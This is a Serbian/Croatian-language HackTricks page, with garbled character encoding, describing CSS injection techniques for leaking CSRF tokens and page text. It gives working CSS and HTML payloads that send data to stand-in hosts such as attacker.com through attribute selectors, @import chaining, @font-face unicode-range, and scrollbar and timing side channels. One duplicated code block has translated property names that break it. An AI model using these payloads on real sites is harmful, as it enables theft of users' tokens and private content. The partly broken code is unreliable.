# CSS Injection

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## CSS Injection

### Selektor atributa

CSS selektori se prave da bi se poklapali sa vrednostima atributa `name` i `value` elementa `input`. Ako vrednost atributa `value` elementa `input` poÄinje odreÄ‘enim karakterom, uÄitava se unapred definisani spoljni resurs:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
MeÄ‘utim, ovaj pristup ima ograniÄenje prilikom rada sa skrivenim input elementima (`type="hidden"`) jer skriveni elementi ne uÄitavaju pozadine.

#### ZaobilaÅ¾enje za skrivene elemente

Da biste zaobiÅ¡li ovo ograniÄenje, moÅ¾ete ciljati sledeÄ‡i susedni element koristeÄ‡i `~` kombinator za opÅ¡te susede. CSS pravilo se primenjuje na sve susede koji slede nakon skrivenog input elementa, Å¡to dovodi do uÄitavanja pozadinske slike:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
PraktiÄan primer iskoriÅ¡Ä‡avanja ove tehnike detaljno je opisan u priloÅ¾enom kodu. MoÅ¾ete ga pogledati [ovde](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Pretpostavke za CSS ubacivanje

Da bi tehnika CSS ubacivanja bila efikasna, moraju se ispuniti odreÄ‘eni uslovi:

1. **DuÅ¾ina Payload-a**: Vektor CSS ubacivanja mora podrÅ¾avati dovoljno dugaÄke payload-e kako bi se mogli smestiti izraÄ‘eni selektori.
2. **Ponovno vrednovanje CSS-a**: Trebali biste imati moguÄ‡nost okvira stranice, Å¡to je neophodno da bi se pokrenulo ponovno vrednovanje CSS-a sa novo generisanim payload-ima.
3. **Spoljni resursi**: Tehnika pretpostavlja moguÄ‡nost koriÅ¡Ä‡enja slika sa spoljnih servera. Ovo moÅ¾e biti ograniÄeno politikom bezbednosti sadrÅ¾aja (CSP) sajta.

### Slepi selektor atributa

Kao Å¡to je [**objaÅ¡njeno u ovom postu**](https://portswigger.net/research/blind-css-exfiltration), moguÄ‡e je kombinovati selektore **`:has`** i **`:not`** kako bi se identifikovao sadrÅ¾aj Äak i iz slepih elemenata. Ovo je veoma korisno kada nemate pojma Å¡ta se nalazi unutar veb stranice koja uÄitava CSS ubacivanje.\
TakoÄ‘e je moguÄ‡e koristiti ove selektore kako bi se izvukle informacije iz nekoliko blokova istog tipa, kao Å¡to je:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
KombinujuÄ‡i ovo sa sledeÄ‡om tehnikom **@import**, moguÄ‡e je eksfiltrirati mnogo **informacija koristeÄ‡i CSS ubacivanje sa slepim stranicama pomoÄ‡u** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

Prethodna tehnika ima neke nedostatke, proverite preduslove. Morate ili biti u moguÄ‡nosti da **poÅ¡aljete viÅ¡e linkova Å¾rtvi**, ili morate biti u moguÄ‡nosti da **ubacite CSS na ranjivu stranicu putem iframe-a**.

MeÄ‘utim, postoji joÅ¡ jedna pametna tehnika koja koristi **CSS `@import`** da bi poboljÅ¡ala kvalitet tehnike.

Ovo je prvi put pokazao [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) i radi na sledeÄ‡i naÄin:

Umesto da uÄitavamo istu stranicu iznova i iznova sa desetinama razliÄitih payloada svaki put (kao u prethodnoj tehnici), mi Ä‡emo **uÄitati stranicu samo jednom i samo sa importom na server napadaÄa** (ovo je payload koji se Å¡alje Å¾rtvi):
```css
@import url('//attacker.com:5001/start?');
```
1. Uvoz Ä‡e **primiti neki CSS skript** od napadaÄa i **pregledaÄ Ä‡e ga uÄitati**.
2. Prvi deo CSS skripta koji Ä‡e napadaÄ poslati je **joÅ¡ jedan `@import` ka serveru napadaÄa**.
1. Server napadaÄa neÄ‡e odmah odgovoriti na ovaj zahtev, jer Å¾elimo da procurimo neke karaktere, a zatim odgovorimo na ovaj uvoz sa payloadom kako bismo procurili sledeÄ‡e.
3. Drugi i veÄ‡i deo payloada Ä‡e biti **payload za curenje selektora atributa**.
1. Ovo Ä‡e poslati serveru napadaÄa **prvi karakter tajne i poslednji karakter**.
4. Kada server napadaÄa primi **prvi i poslednji karakter tajne**, odgovoriÄ‡e na uvoz koji je zatraÅ¾en u koraku 2.
1. Odgovor Ä‡e biti taÄno isti kao **koraci 2, 3 i 4**, ali ovaj put Ä‡e pokuÅ¡ati **pronaÄ‡i drugi karakter tajne, a zatim predposlednji**.

NapadaÄ Ä‡e **ponavljati ovu petlju dok ne uspe potpuno da procuri tajnu**.

Originalni kod [**Pepe Vile za iskoriÅ¡Ä‡avanje ovoga moÅ¾ete pronaÄ‡i ovde**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) ili moÅ¾ete pronaÄ‡i skoro [**isti kod, ali komentiran ovde**](./#css-injection).

{% hint style="info" %}
Skripta Ä‡e pokuÅ¡ati da otkrije 2 karaktera svaki put (sa poÄetka i sa kraja), jer selektor atributa omoguÄ‡ava stvari poput:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
Ovo omoguÄ‡ava skriptu da brÅ¾e otkrije tajnu.
{% endhint %}

{% hint style="warning" %}
Ponekad skripta **neÄ‡e taÄno prepoznati da je pronaÄ‘eni prefiks + sufiks veÄ‡ kompletan flag** i nastaviÄ‡e napred (u prefiksu) i nazad (u sufiksu) i u nekom trenutku Ä‡e se zaglaviti.\
Nema brige, samo proverite **izlaz** jer **tamo moÅ¾ete videti flag**.
{% endhint %}

### Ostali selektori

Drugi naÄini pristupa delovima DOM-a pomoÄ‡u **CSS selektora**:

* **`.class-to-search:nth-child(2)`**: Ovo Ä‡e pronaÄ‡i drugu stavku sa klasom "class-to-search" u DOM-u.
*   **`:empty`** selektor: Koristi se na primer u [**ovom writeup-u**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### XS-Search zasnovan na greÅ¡kama

**Reference:** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

OpÅ¡ti cilj je **koristiti prilagoÄ‘eni font sa kontrolisane taÄke** i osigurati da se **tekst (u ovom sluÄaju, 'A') prikaÅ¾e samo sa ovim fontom ako odreÄ‘eni resurs (`favicon.ico`) ne moÅ¾e da se uÄita**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **KoriÅ¡Ä‡enje prilagoÄ‘enog fonta**:
- PrilagoÄ‘eni font se definiÅ¡e koriÅ¡Ä‡enjem pravila `@font-face` unutar `<style>` oznake u `<head>` sekciji.
- Font se naziva `poc` i preuzima se sa spoljnog izvora (`http://attacker.com/?leak`).
- Svojstvo `unicode-range` je postavljeno na `U+0041`, ciljajuÄ‡i specifiÄan Unicode karakter 'A'.

2. **Element objekta sa rezervnim tekstom**:
- U `<body>` sekciji se kreira `<object>` element sa `id="poc0"`. Ovaj element pokuÅ¡ava da uÄita resurs sa adrese `http://192.168.0.1/favicon.ico`.
- `font-family` za ovaj element je postavljen na `'poc'`, kako je definisano u `<style>` sekciji.
- Ako resurs (`favicon.ico`) ne moÅ¾e da se uÄita, rezervni sadrÅ¾aj (slovo 'A') unutar `<object>` oznake Ä‡e biti prikazan.
- Rezervni sadrÅ¾aj ('A') Ä‡e biti prikazan koristeÄ‡i prilagoÄ‘eni font `poc` ako se spoljni resurs ne moÅ¾e uÄitati.

### Stilizacija fragmenta teksta za skrolovanje

**`:target`** pseudo-klasa se koristi za selektovanje elementa koji je cilj nekog **URL fragmenta**, kako je navedeno u [CSS Selectors Level 4 specifikaciji](https://drafts.csswg.org/selectors-4/#the-target-pseudo). VaÅ¾no je razumeti da `::target-text` ne odgovara nijednom elementu osim ako tekst nije eksplicitno cilj fragmenta.

Postoji bezbednosna zabrinutost kada napadaÄi iskoriÅ¡Ä‡avaju moguÄ‡nost skrolovanja do teksta fragmenta, Å¡to im omoguÄ‡ava da potvrde prisustvo odreÄ‘enog teksta na veb stranici uÄitavanjem resursa sa svojeg servera putem HTML injekcije. Metoda ukljuÄuje ubacivanje CSS pravila kao Å¡to je ovo:
```css
:target::before { content : url(target.png) }
```
U takvim scenarijima, ako se tekst "Administrator" nalazi na stranici, sa servera se zahteva resurs `target.png`, Å¡to ukazuje na prisustvo teksta. Primer ovog napada moÅ¾e se izvrÅ¡iti putem posebno kreiranog URL-a koji ugraÄ‘uje ubaÄeni CSS zajedno sa fragmentom Scroll-to-text:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Evo, napad manipuliÅ¡e HTML ubacivanjem kako bi preneo CSS kod, ciljajuÄ‡i odreÄ‘eni tekst "Administrator" putem Scroll-to-text fragmenta (`#:~:text=Administrator`). Ako se tekst pronaÄ‘e, uÄitava se naznaÄeni resurs, nenamerno signalizirajuÄ‡i njegovo prisustvo napadaÄu.

Za ublaÅ¾avanje, treba obratiti paÅ¾nju na sledeÄ‡e taÄke:

1. **OgraniÄeno podudaranje STTF**: Scroll-to-text Fragment (STTF) je dizajniran da se podudara samo sa reÄima ili reÄenicama, Äime se ograniÄava njegova sposobnost da otkrije proizvoljne tajne ili tokene.
2. **OgraniÄenje na vrhunske pregledaÄke kontekste**: STTF funkcioniÅ¡e samo u vrhunskim pregledaÄkim kontekstima i ne funkcioniÅ¡e unutar iframe-ova, Å¡to Äini svaki pokuÅ¡aj iskoriÅ¡Ä‡avanja primetnijim korisniku.
3. **Potreba za aktivacijom korisnika**: STTF zahteva gest aktivacije korisnika da bi radio, Å¡to znaÄi da su iskoriÅ¡Ä‡avanja izvodljiva samo putem navigacija koje korisnik pokreÄ‡e. Ovaj zahtev znaÄajno umanjuje rizik od automatizovanih napada bez interakcije korisnika. Ipak, autor blog posta ukazuje na odreÄ‘ene uslove i zaobilaznice (npr. socijalno inÅ¾enjerstvo, interakcija sa popularnim ekstenzijama pregledaÄa) koje mogu olakÅ¡ati automatizaciju napada.

Svest o ovim mehanizmima i potencijalnim ranjivostima kljuÄna je za odrÅ¾avanje bezbednosti veb stranica i zaÅ¡tite od takvih iskoriÅ¡Ä‡avaÄkih taktika.

Za viÅ¡e informacija pogledajte originalni izveÅ¡taj: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

MoÅ¾ete proveriti [**eksploit koji koristi ovu tehniku za CTF ovde**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

MoÅ¾ete specificirati **spoljne fontove za odreÄ‘ene Unicode vrednosti** koje Ä‡e biti prikupljene samo ako su te Unicode vrednosti prisutne na stranici. Na primer:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
Kada pristupite ovoj stranici, Chrome i Firefox dohvaÄ‡aju "?A" i "?B" jer tekstni Ävor osjetljivih informacija sadrÅ¾i znakove "A" i "B". Ali Chrome i Firefox ne dohvaÄ‡aju "?C" jer ne sadrÅ¾i "C". To znaÄi da smo uspjeli proÄitati "A" i "B".

### IzvlaÄenje teksta iz Ävora (I): ligature <a href="#izvlaÄenje-teksta-iz-Ävora-i-ligature" id="izvlaÄenje-teksta-iz-Ävora-i-ligature"></a>

**Reference:** [Wykradanie danych w Å›wietnym stylu â€“ czyli jak wykorzystaÄ‡ CSS-y do atakÃ³w na webaplikacjÄ™](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

Opisana tehnika ukljuÄuje izvlaÄenje teksta iz Ävora iskoriÅ¡tavanjem ligatura fonta i praÄ‡enjem promjena u Å¡irini. Postupak ukljuÄuje nekoliko koraka:

1. **Stvaranje prilagoÄ‘enih fontova**:
- SVG fontovi se izraÄ‘uju s glifovima koji imaju atribut `horiz-adv-x`, koji postavlja veliku Å¡irinu za glif koji predstavlja dvoslovni niz.
- Primjer SVG glifa: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, gdje "XY" oznaÄava dvoslovni niz.
- Ti fontovi se zatim pretvaraju u woff format pomoÄ‡u fontforge.

2. **Otkrivanje promjena u Å¡irini**:
- CSS se koristi kako bi se osiguralo da se tekst ne prelomi (`white-space: nowrap`) i kako bi se prilagodio stil trake za pomicanje.
- Pojava vodoravne trake za pomicanje, stilizirane na poseban naÄin, djeluje kao indikator (orakl) da je odreÄ‘ena ligatura, a time i odreÄ‘eni niz znakova, prisutan u tekstu.
- UkljuÄeni CSS:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **Proces iskoriÅ¡tavanja**:
- **Korak 1**: Stvaraju se fontovi za parove znakova s velikom Å¡irinom.
- **Korak 2**: Koristi se trik s trakom za pomicanje kako bi se otkrilo kada je prikazan glif velike Å¡irine (ligatura za par znakova), Å¡to ukazuje na prisutnost niza znakova.
- **Korak 3**: Nakon otkrivanja ligature, generiraju se novi glifovi koji predstavljaju nizove od tri znaka, ukljuÄujuÄ‡i otkriveni par i dodavanje prethodnog ili sljedeÄ‡eg znaka.
- **Korak 4**: Provodi se otkrivanje ligature od tri znaka.
- **Korak 5**: Postupak se ponavlja, postupno otkrivajuÄ‡i cijeli tekst.

4. **Optimizacija**:
- Trenutna metoda inicijalizacije pomoÄ‡u `<meta refresh=...` nije optimalna.
- UÄinkovitiji pristup mogao bi ukljuÄivati trik s CSS `@import`, poboljÅ¡avajuÄ‡i performanse iskoriÅ¡tavanja.

### IzvlaÄenje teksta iz Ävora (II): procurivanje skupa znakova s zadanim fontom (bez potrebe za vanjskim resursima) <a href="#izvlaÄenje-teksta-iz-Ävora-ii-procurivanje-skupa-znakova-s-zadanim-fontom" id="izvlaÄenje-teksta-iz-Ävora-ii-procurivanje-skupa-znakova-s-zadanim-fontom"></a>

**Reference:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Ovaj trik je objavljen u ovoj [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/). Skup znakova koji se koristi u Ävoru teksta moÅ¾e procuriti **koriÅ¡tenjem zadanih fontova** instaliranih u pregledniku: nisu potrebni vanjski - ili prilagoÄ‘eni - fontovi.

Koncept se temelji na koriÅ¡tenju animacije za postupno poveÄ‡anje Å¡irine `div`-a, omoguÄ‡avajuÄ‡i da se jedan znak u svakom trenutku prelazi iz "sufiksa" dijela teksta u "prefiks" dio. Ovaj postupak efektivno dijeli tekst na dva dijela:

1. **Prefiks**: PoÄetni redak.
2. **Sufiks**: Naknadni redak(i).

Prijelazne faze znakova izgledale bi ovako:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


Tijekom ovog prijelaza koristi se trik s **unicode-range** kako bi se identificirao svaki novi znak dok se pridruÅ¾uje prefiksu. To se postiÅ¾e prebacivanjem fonta na Comic Sans, koji je primjetno viÅ¡i od zadanih fontova, Å¡to posljediÄno pokreÄ‡e okomitu traku za pomicanje. Pojava ove trake za pomicanje neizravno otkriva prisutnost novog znaka u prefiksu.

Iako ovaj naÄin omoguÄ‡uje otkrivanje jedinstvenih znakova kako se pojavljuju, ne specificira koji se znak ponavlja, samo da se ponavljanje dogodilo.

{% hint style="info" %}
U osnovi, **unicode-range se koristi za otkrivanje znaka**, ali buduÄ‡i da ne Å¾elimo uÄitavati vanjski font, moramo pronaÄ‡i drugi naÄin.\
Kada se **znak pronaÄ‘e**, dodjeljuje mu se prethodno instalirani **Comic Sans font**, Å¡to Äini znak **veÄ‡im** i **pokreÄ‡e traku za pomicanje** koja Ä‡e **procijediti pronaÄ‘eni znak**.
{% endhint %}

Provjerite kod izdvojen iz PoC-a:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
```css
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```

```css
5% { Å¡irina: 120px }
6% { Å¡irina: 140px }
7% { Å¡irina: 0px }
}

div::-webkit-scrollbar {
background: plava;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: plava var(--leak);
}
```
### Eksfiltracija teksta Ävora (III): otkrivanje skupa znakova pomoÄ‡u podrazumevanog fonta sakrivanjem elemenata (ne zahteva spoljne resurse) <a href="#eksfiltracija-teksta-Ävora-ii-otkrivanje-skupa-znakova-pomoÄ‡u-podrazumevanog-fonta" id="eksfiltracija-teksta-Ävora-ii-otkrivanje-skupa-znakova-pomoÄ‡u-podrazumevanog-fonta"></a>

**Reference:** Ovo je pomenuto kao [neuspeÅ¡no reÅ¡enje u ovom Älanku](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Ovaj sluÄaj je veoma sliÄan prethodnom, meÄ‘utim, u ovom sluÄaju cilj je da se odreÄ‘eni **znakovi uÄine veÄ‡im od drugih kako bi se neÅ¡to sakrilo**, poput dugmeta koje bot ne sme da pritisne ili slike koja se neÄ‡e uÄitati. Na taj naÄin moÅ¾emo izmeriti akciju (ili nedostatak akcije) i saznati da li se odreÄ‘eni znak nalazi unutar teksta.

### Eksfiltracija teksta Ävora (III): otkrivanje skupa znakova putem vremena keÅ¡iranja (ne zahteva spoljne resurse) <a href="#eksfiltracija-teksta-Ävora-ii-otkrivanje-skupa-znakova-pomoÄ‡u-podrazumevanog-fonta" id="eksfiltracija-teksta-Ävora-ii-otkrivanje-skupa-znakova-pomoÄ‡u-podrazumevanog-fonta"></a>

**Reference:** Ovo je pomenuto kao [neuspeÅ¡no reÅ¡enje u ovom Älanku](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

U ovom sluÄaju, moÅ¾emo pokuÅ¡ati da otkrijemo da li se odreÄ‘eni znak nalazi u tekstu uÄitavanjem laÅ¾nog fonta sa istog izvora:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
Ako postoji podudaranje, **font Ä‡e se uÄitati sa `/static/bootstrap.min.css?q=1`**. Iako se neÄ‡e uspeÅ¡no uÄitati, **pregledaÄ bi ga trebao keÅ¡irati**, i Äak i ako nema keÅ¡a, postoji mehanizam **304 not modified**, tako da bi **odgovor trebao biti brÅ¾i** od ostalih stvari.

MeÄ‘utim, ako vremenska razlika izmeÄ‘u keÅ¡iranog odgovora i neke koji nije keÅ¡iran nije dovoljno velika, ovo neÄ‡e biti korisno. Na primer, autor je pomenuo: MeÄ‘utim, nakon testiranja, primetio sam da je prvi problem to Å¡to brzina nije mnogo drugaÄija, a drugi problem je Å¡to bot koristi zastavicu `disk-cache-size=1`, Å¡to je zaista paÅ¾ljivo.

### Eksfiltracija teksta Ävora (III): otkrivanje skupa znakova merenjem vremena uÄitavanja stotina lokalnih "fontova" (bez potrebe za spoljnim resursima) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Ovo je pomenuto kao [neuspeÅ¡no reÅ¡enje u ovom Älanku](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

U ovom sluÄaju moÅ¾ete navesti **CSS da uÄita stotine laÅ¾nih fontova** sa istog izvora kada se desi podudaranje. Na taj naÄin moÅ¾ete **meriti vreme** koje je potrebno i saznati da li se pojavljuje odreÄ‘eni znak ili neÅ¡to sliÄno:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
I kod bota izgleda ovako:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Dakle, ako font ne odgovara, oÄekuje se da Ä‡e vreme odgovora prilikom posete botu biti otprilike 30 sekundi. MeÄ‘utim, ako postoji podudaranje fonta, biÄ‡e poslato viÅ¡e zahteva za dobijanje fonta, Å¡to Ä‡e izazvati kontinuiranu aktivnost na mreÅ¾i. Kao rezultat toga, trebaÄ‡e viÅ¡e vremena da se zadovolji uslov zaustavljanja i primi odgovor. Stoga, vreme odgovora moÅ¾e se koristiti kao indikator za odreÄ‘ivanje da li postoji podudaranje fonta.

## Reference

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju oglaÅ¡enu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
